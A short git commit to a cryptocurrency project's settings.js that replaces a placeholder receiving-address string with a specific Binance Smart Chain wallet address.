5304c0cdad28b5b3ecf66b49666257b64f7356e5
cryptogod2003 <113948726+cryptogod2003@users.noreply.github.com>
2022-09-19 23:52:33 +0100

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x56361F97c728D11f21208e1122BaB05279A37BfA";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
